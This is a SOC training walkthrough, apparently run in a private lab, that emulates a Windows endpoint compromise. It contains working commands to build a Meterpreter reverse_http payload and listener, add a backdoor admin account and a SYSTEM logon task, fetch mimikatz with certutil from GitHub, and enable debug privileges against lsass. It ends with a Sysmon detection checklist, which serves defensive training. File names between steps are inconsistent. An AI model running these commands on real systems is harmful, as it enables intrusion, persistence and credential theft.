# 🎯 Adversary Emulation Walkthrough: Endpoint Compromise & Credential Access

> **⚠️ AUTHORIZED LAB ENVIRONMENT USE ONLY**  
> All commands and procedures documented below were executed inside an isolated, controlled private lab environment for SOC analyst training, threat hunting verification, and detection engineering research. Do not execute these commands on unauthorized systems or production networks.

---

## 📋 Environment Configuration

| Role | Hostname / OS | IP Address | Purpose |
|:---|:---|:---|:---|
| **Attacker Host** | `kali-linux` | `192.168.110.141` | Payload generation, C2 listener, post-exploitation staging |
| **Victim Endpoint** | `SH-WIN10` (Windows 10 22H2) | `192.168.110.156` | Victim target with Sysmon v14+ & Splunk Universal Forwarder |
| **SIEM Platform** | Windows 11 | `192.168.110.x` | Splunk Enterprise 9.x/10.x receiving telemetry on TCP `9997` |

---

## 🛠️ Phase-by-Phase Simulation Guide

### Phase 1: Payload Generation & Staging (Attacker - Kali Linux)

1. Generate the 64-bit Windows Reverse HTTP Meterpreter executable:
```bash
msfvenom -p windows/x64/meterpreter/reverse_http \
         LHOST=192.168.110.141 \
         LPORT=33398 \
         -f exe -o FreeClude.exe
```

2. Start the Metasploit multi-handler listener:
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_http
set LHOST 192.168.110.141
set LPORT 33398
set ExitOnSession false
exploit -j
```

---

### Phase 2: Delivery & Initial Execution (Victim - Windows 10)

1. **Delivery Simulation**: The payload `FreeClude.exe` is sent via Telegram Web or staged web link.
2. The browser generates the Mark-of-the-Web (MOTW) alternate data stream:
   - Target: `C:\Users\saada\Downloads\FreeClude.exe`
   - ADS Stream: `Unconfirmed 635978.crdownload:Zone.Identifier`
   - `ZoneId=3` (Internet Zone)
   - `HostUrl=https://web.telegram.org/`
3. **Execution**: The user `SH-WIN10\saad` double-clicks `FreeClude.exe` in `C:\Users\saada\Downloads\` with High integrity elevation.

---

### Phase 3: Command & Control Callback

1. `FreeClude.exe` (PID `5568`) initializes and establishes an outbound TCP connection:
   - Source: `192.168.110.156:55196`
   - Destination: `192.168.110.141:33398`
2. Meterpreter session checks in:
```text
[*] http://192.168.110.141:33398 handling request from 192.168.110.156; (UUID: ...) Staging x64 payload (207449 bytes)...
[*] Meterpreter session 1 opened (192.168.110.141:33398 -> 192.168.110.156:55196)
```

---

### Phase 4: Interactive Shell & Discovery

1. From the Meterpreter session, drop into an interactive Windows command shell:
```text
meterpreter > shell
Process 6316 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.
```

2. Perform environmental and user discovery:
```cmd
whoami
REM Output: SH-WIN10\saad

hostname
REM Output: SH-WIN10

systeminfo
REM Enumerates OS configuration, patch level, network adapters
```

---

### Phase 5A: Local Account Creation & Persistence

1. Create a rogue local user account for backdoor access:
```cmd
net user ClaudeBackdoor Password123! /add
REM Command completed successfully.
```

2. Escalate privileges by adding the account to the local Administrators group:
```cmd
net localgroup Administrators ClaudeBackdoor /add
REM Command completed successfully.
```

---

### Phase 5B: Scheduled Task Persistence (SYSTEM Privileges)

1. Create a persistent scheduled task configured to execute `FreeClude.exe` on user logon with `NT AUTHORITY\SYSTEM` elevation:
```cmd
schtasks /create /tn "GetClaudeBackdoor" /tr "C:\Users\saada\Downloads\FreeClude.exe" /sc onlogon /ru SYSTEM
REM SUCCESS: The scheduled task "GetClaudeBackdoor" has successfully been created.
```

---

### Phase 5C: Defense Evasion & Cleanup

1. Remove the temporary local account to evade routine user audits while relying on the scheduled task:
```cmd
net user ClaudeBackdoor /delete
REM The command completed successfully.
```

---

### Phase 6: Ingress Tool Transfer via certutil.exe

1. Download the secondary credential-access tool using the native Living-off-the-Land Binary (LOLBin) `certutil.exe`:
```cmd
certutil -urlcache -split -f "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe" C:\Users\saada\Downloads\FreeClude.exe
REM Notice: The operator stages mimikatz under GetClaude.exe / FreeClude.exe to blend in
```

---

### Phase 7: Credential Access Preparation (Mimikatz)

1. Execute the staged credential-access binary:
```cmd
cd C:\Users\saada\Downloads
GetClaude.exe
```

2. Request debug privileges within the Mimikatz interactive prompt:
```text
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Clé, Avec de Sang"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'    Portions (c) 2004-2021 Vincent LE TOUX           * * */

mimikatz # privilege::debug
Privilege '20' OK
```
*Note: Successful elevation confirms debug privileges required for targeting the Local Security Authority Subsystem Service (`lsass.exe`).*

---

## 🔍 Verification Checklist for SOC Defenders

- [x] **Phase 1**: Sysmon Event ID 15 captures MOTW and ZoneId=3 from Telegram Web URL.
- [x] **Phase 2**: Sysmon Event ID 1 records `FreeClude.exe` executed by `explorer.exe` with High Integrity.
- [x] **Phase 3**: Sysmon Event ID 3 correlates network traffic to `192.168.110.141:33398` via `ProcessGuid`.
- [x] **Phase 4**: Sysmon Event ID 1 records `cmd.exe` spawning `whoami.exe`, `hostname.exe`, `systeminfo.exe`.
- [x] **Phase 5A**: Sysmon Event ID 1 + Windows Security Events `4720` and `4732` capture `ClaudeBackdoor`.
- [x] **Phase 5B**: Sysmon Event ID 1/7 + Windows Security Event `4698` capture scheduled task `GetClaudeBackdoor`.
- [x] **Phase 6**: Sysmon Event IDs 1, 3, and 11 capture `certutil.exe /urlcache` staging `GetClaude.exe`.
- [x] **Phase 7**: Sysmon Event ID 1 captures `GetClaude.exe` and `privilege::debug` command-line invocation.
